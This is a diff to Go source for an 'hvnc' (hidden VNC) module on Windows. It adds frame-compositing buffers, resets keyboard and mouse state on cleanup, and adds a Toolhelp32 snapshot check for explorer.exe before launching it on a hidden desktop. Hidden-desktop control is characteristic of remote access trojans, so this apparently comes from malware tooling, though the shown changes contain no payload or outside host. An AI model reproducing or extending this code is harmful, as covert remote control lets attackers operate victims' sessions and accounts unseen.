@@ -173,7 +173,16 @@ var (
 
 	// Capture cache: pooled DC/DIB per window to avoid per-frame allocation
 	hvncWinCache     map[uintptr]*hvncWinCacheEntry
-	hvncWinCachePrev []byte // previous composite frame for dirty detection
+	hvncWinCachePrev []byte
+
+	hvncCompHdcMem uintptr
+	hvncCompHbmp   uintptr
+	hvncCompBits   unsafe.Pointer
+	hvncCompW      int
+	hvncCompH      int
+
+	hvncPendingMouseMove *hvncTask
+	hvncPendingMoveMu    sync.Mutex
 )
 
 type hvncTaskKind int
@@ -354,6 +363,28 @@ func CleanupHVNCDesktop() {
 	}
 	hvncWinCache = nil
 	hvncWinCachePrev = nil
+
+	if hvncCompHbmp != 0 {
+		deleteObject(hvncCompHbmp)
+		hvncCompHbmp = 0
+	}
+	if hvncCompHdcMem != 0 {
+		deleteDC(hvncCompHdcMem)
+		hvncCompHdcMem = 0
+	}
+	hvncCompBits = nil
+	hvncCompW = 0
+	hvncCompH = 0
+
+	hvncInputMu.Lock()
+	hvncShiftDown = false
+	hvncCtrlDown = false
+	hvncAltDown = false
+	hvncCapsLock = false
+	hvncMouseButtons = 0
+	hvncHasCursor = false
+	hvncWorkingWindow = 0
+	hvncInputMu.Unlock()
 
 	if hvncDesktopHandle != 0 {
 		if hvncOriginalDesktop != 0 {
@@ -817,19 +848,7 @@ func hvncAutoStartExplorerOnThread() error {
 		return nil
 	}
 
-	found := false
-	hwnd := getTopWindow(0)
-	for hwnd != 0 {
-		var pid uint32
-		procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
-		if pid != 0 && isExplorerPID(pid) {
-			found = true
-			break
-		}
-		hwnd = getWindow(hwnd, GW_HWNDNEXT)
-	}
-
-	if found {
+	if isExplorerRunningToolhelp() {
 		log.Printf("hvnc: explorer.exe already running on HVNC desktop, skipping auto-start")
 		hvncExplorerStarted = true
 		return nil
@@ -864,6 +883,41 @@ func isExplorerPID(pid uint32) bool {
 	}
 	name := strings.ToLower(syscall.UTF16ToString(buf[:size]))
 	return strings.HasSuffix(name, `\explorer.exe`)
+}
+
+func isExplorerRunningToolhelp() bool {
+	const TH32CS_SNAPPROCESS = 0x00000002
+	snap, _, _ := kernel32.NewProc("CreateToolhelp32Snapshot").Call(TH32CS_SNAPPROCESS, 0)
+	if snap == 0 || snap == ^uintptr(0) {
+		return false
+	}
+	defer procCloseHandle.Call(snap)
+
+	type processEntry32 struct {
+		dwSize              uint32
+		cntUsage            uint32
+		th32ProcessID       uint32
+		th32DefaultHeapID   uintptr
+		th32ModuleID        uint32
+		cntThreads          uint32
+		th32ParentProcessID uint32
+		pcPriClassBase      int32
+		dwFlags             uint32
+		szExeFile           [260]uint16
+	}
+
+	var pe processEntry32
+	pe.dwSize = uint32(unsafe.Sizeof(pe))
+	ret, _, _ := kernel32.NewProc("Process32FirstW").Call(snap, uintptr(unsafe.Pointer(&pe)))
+	for ret != 0 {
+		name := strings.ToLower(syscall.UTF16ToString(pe.szExeFile[:]))
+		if name == "explorer.exe" {
+			return true
+		}
+		pe.dwSize = uint32(unsafe.Sizeof(pe))
+		ret, _, _ = kernel32.NewProc("Process32NextW").Call(snap, uintptr(unsafe.Pointer(&pe)))
+	}
+	return false
 }
 
 func hvncMouseMoveOnThread(display int, x, y int32) error {
